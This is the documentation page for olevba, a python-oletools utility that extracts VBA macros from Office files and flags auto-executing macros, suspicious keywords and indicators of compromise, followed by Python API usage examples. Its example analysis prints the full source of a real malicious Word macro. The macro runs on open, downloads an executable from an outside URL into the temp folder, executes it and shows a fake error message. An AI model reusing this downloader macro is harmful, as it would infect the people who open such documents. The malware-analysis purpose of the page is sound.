olevba
======

olevba is a script to parse OLE and OpenXML files such as MS Office documents
(e.g. Word, Excel), to **detect VBA Macros**, extract their **source code** in clear text, 
and detect security-related patterns such as **auto-executable macros**, **suspicious
VBA keywords** used by malware, and potential **IOCs** (IP addresses, URLs, executable
filenames, etc).

It can be used either as a command-line tool, or as a python module from your own applications.

It is part of the [python-oletools](http://www.decalage.info/python/oletools) package.

olevba is based on source code from [officeparser](https://github.com/unixfreak0037/officeparser) 
by John William Davison, with significant modifications.

## Supported formats

- Word 97-2003 (.doc, .dot), Word 2007+ (.docm, .dotm)
- Excel 97-2003 (.xls), Excel 2007+ (.xlsm, .xlsb)
- PowerPoint 2007+ (.pptm, .ppsm)

## Main Features

- Detect VBA macros in MS Office 97-2003 and 2007+ files
- Extract VBA macro source code
- Detect auto-executable macros
- Detect suspicious VBA keywords often used by malware
- Extract IOCs/patterns of interest such as IP addresses, URLs, e-mail addresses and executable file names
- Scan multiple files and sample collections (wildcards, recursive)
- Scan malware samples in password-protected Zip archives
- Python API to use olevba from your applications

MS Office files encrypted with a password are also supported, because VBA macro code is never
encrypted, only the content of the document.

## About VBA Macros

See [this article](http://www.decalage.info/en/vba_tools) for more information and technical details about VBA Macros
and how they are stored in MS Office documents.

## Usage

	:::text
    Usage: olevba.py [options] <filename> [filename2 ...]
    
    Options:
      -h, --help            show this help message and exit
      -r                    find files recursively in subdirectories.
      -z ZIP_PASSWORD, --zip=ZIP_PASSWORD
                            if the file is a zip archive, open first file from it,
                            using the provided password (requires Python 2.6+)
      -f ZIP_FNAME, --zipfname=ZIP_FNAME
                            if the file is a zip archive, file(s) to be opened
                            within the zip. Wildcards * and ? are supported.
                            (default:*)
                            
### Example

Checking the malware sample [DIAN_caso-5415.doc](https://malwr.com/analysis/M2I4YWRhM2IwY2QwNDljN2E3ZWFjYTg3ODk4NmZhYmE/):

	:::text
    >olevba.py c:\MalwareZoo\VBA\DIAN_caso-5415.doc.zip -z infected
    ===============================================================================
    FILE: DIAN_caso-5415.doc.malware in c:\MalwareZoo\VBA\DIAN_caso-5415.doc.zip
    Type: OLE
    -------------------------------------------------------------------------------
    VBA MACRO ThisDocument.cls
    in file: DIAN_caso-5415.doc.malware - OLE stream: Macros/VBA/ThisDocument
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    Option Explicit
    Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal FVQGKS As Long,_
    ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, _
    ByVal HQTLDG As Long) As Long
    Sub AutoOpen()
        Auto_Open
    End Sub
    Sub Auto_Open()
    SNVJYQ
    End Sub
    Public Sub SNVJYQ()
        OGEXYR "http://germanya.com.ec/logs/test.exe", Environ("TMP") & "\sfjozjero.
    exe"
    End Sub
    Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
        Dim HRKUYU, lala As Long
        HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
        If HRKUYU = 0 Then OGEXYR = True
        Dim YKPZZS
        YKPZZS = Shell(PHHWIV, 1)
        MsgBox "El contenido de este documento no es compatible con este equipo." &
    vbCrLf & vbCrLf & "Por favor intente desde otro equipo.", vbCritical, "Equipo no
     compatible"
        lala = URLDownloadToFileA(0, "http://germanya.com.ec/logs/counter.php", Envi
    ron("TMP") & "\lkjljlljk", 0, 0)
        Application.DisplayAlerts = False
        Application.Quit
    End Function
    Sub Workbook_Open()
        Auto_Open
    End Sub
    
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    ANALYSIS:
    +------------+----------------------+-----------------------------------------+
    | Type       | Keyword              | Description                             |
    +------------+----------------------+-----------------------------------------+
    | AutoExec   | AutoOpen             | Runs when the Word document is opened   |
    | AutoExec   | Auto_Open            | Runs when the Excel Workbook is opened  |
    | AutoExec   | Workbook_Open        | Runs when the Excel Workbook is opened  |
    | Suspicious | Lib                  | May run code from a DLL                 |
    | Suspicious | Shell                | May run an executable file or a system  |
    |            |                      | command                                 |
    | Suspicious | Environ              | May read system environment variables   |
    | Suspicious | URLDownloadToFileA   | May download files from the Internet    |
    | IOC        | http://germanya.com. | URL                                     |
    |            | ec/logs/test.exe"    |                                         |
    | IOC        | http://germanya.com. | URL                                     |
    |            | ec/logs/counter.php" |                                         |
    | IOC        | germanya.com         | Executable file name                    |
    | IOC        | test.exe             | Executable file name                    |
    | IOC        | sfjozjero.exe        | Executable file name                    |
    +------------+----------------------+-----------------------------------------+

## How to use olevba in Python applications	

olevba may be used to open a MS Office file, detect if it contains VBA macros, extract and analyze the VBA source code 
from your own python applications.

### Import olevba

First, import the **oletools.olevba** package, using at least the VBA_Parser class:

    :::python
    from oletools.olevba import VBA_Parser
    
### Parse a MS Office file 

Create an instance of the **VBA_Parser** class, providing the name of the file to open as parameter.
The file may also be provided as a bytes string containing its data, or a file-like object. In that case, the actual 
filename may be provided as a second parameter, if available.

    :::python
    vba = VBA_Parser('my_file_with_macros.doc')
    
VBA_Parser will raise an exception if the file is not a supported format, either OLE (MS Office 97-2003) or OpenXML 
(MS Office 2007+). 

### Detect VBA macros

The method **detect_vba_macros** returns True if VBA macros have been found in the file, False otherwise.

    :::python
    if vba.detect_vba_macros():
        print 'VBA Macros found'
    else:
        print 'No VBA Macros found'
        
Note: The detection algorithm looks for streams and storage with specific names in the OLE structure, which works fine
for all the supported formats listed above. However, for some formats such as PowerPoint 97-2003, this method will 
always return False because VBA Macros are stored in a different way.

Moreover, if the file contains an embedded document (e.g. an Excel workbook inserted into a Word document), this method
may return True if the embedded document contains VBA Macros, even if the main document does not.
 
### Extract VBA Macro Source Code
 
The method **extract_macros** extracts and decompresses source code for each VBA macro found in the file (possibly 
including embedded files). It is a generator yielding a tuple (filename, stream_path, vba_filename, vba_code) 
for each VBA macro found.

- filename: If the file is OLE (MS Office 97-2003), filename is the path of the file.
    If the file is OpenXML (MS Office 2007+), filename is the path of the OLE subfile containing VBA macros within the zip archive, 
    e.g. word/vbaProject.bin.
- stream_path: path of the OLE stream containing the VBA macro source code
- vba_filename: corresponding VBA filename
- vba_code: string containing the VBA source code in clear text

Example:

    :::python
    for (filename, stream_path, vba_filename, vba_code) in vba.extract_macros():
        print '-'*79
        print 'Filename    :', filename
        print 'OLE stream  :', stream_path
        print 'VBA filename:', vba_filename
        print '- '*39
        print vba_code
    
### Detect auto-executable macros

The function **detect_autoexec** checks if VBA macro code contains specific macro names
that will be triggered when the document/workbook is opened, closed, changed, etc.

It returns a list of tuples containing two strings, the detected keyword, and the
description of the trigger. (See the malware example above)

Sample usage:

    :::python
    from oletools.olevba import detect_autoexec
    autoexec_keywords = detect_autoexec(vba_code)
    if autoexec_keywords:
        print 'Auto-executable macro keywords found:'
        for keyword, description in autoexec_keywords:
            print '%s: %s' % (keyword, description)
    else:
        print 'Auto-executable macro keywords: None found'


### Detect suspicious VBA keywords

The function **detect_suspicious** checks if VBA macro code contains specific
keywords often used by malware to act on the system (create files, run
commands or applications, write to the registry, etc).

It returns a list of tuples containing two strings, the detected keyword, and the
description of the corresponding malicious behaviour. (See the malware example above)

Sample usage:

    :::python
    from oletools.olevba import detect_suspicious
    suspicious_keywords = detect_suspicious(vba_code)
    if suspicious_keywords:
        print 'Suspicious VBA keywords found:'
        for keyword, description in suspicious_keywords:
            print '%s: %s' % (keyword, description)
    else:
        print 'Suspicious VBA keywords: None found'


### Extract potential IOCs

The function **detect_patterns** checks if VBA macro code contains specific
patterns of interest, that may be useful for malware analysis and detection
(potential Indicators of Compromise): IP addresses, e-mail addresses,
URLs, executable file names.

It returns a list of tuples containing two strings, the pattern type, and the
extracted value. (See the malware example above)

Sample usage:

    :::python
    from oletools.olevba import detect_patterns
    patterns = detect_patterns(vba_code)
    if patterns:
        print 'Patterns found:'
        for pattern_type, value in patterns:
            print '%s: %s' % (pattern_type, value)
    else:
        print 'Patterns: None found'


### Close the VBA_Parser

After usage, it is better to call the **close** method of the VBA_Parser object, to make sure the file is closed, 
especially if your application is parsing many files.

    :::python
    vba.close()

        

--------------------------------------------------------------------------

python-oletools documentation
-----------------------------

- [[Home]]
- [[License]]
- [[Install]]
- [[Contribute]], Suggest Improvements or Report Issues
- Tools:
	- [[olebrowse]]
	- [[oleid]]
	- [[olemeta]]
	- [[oletimes]]
	- [[olevba]]
	- [[pyxswf]]
	- [[rtfobj]] 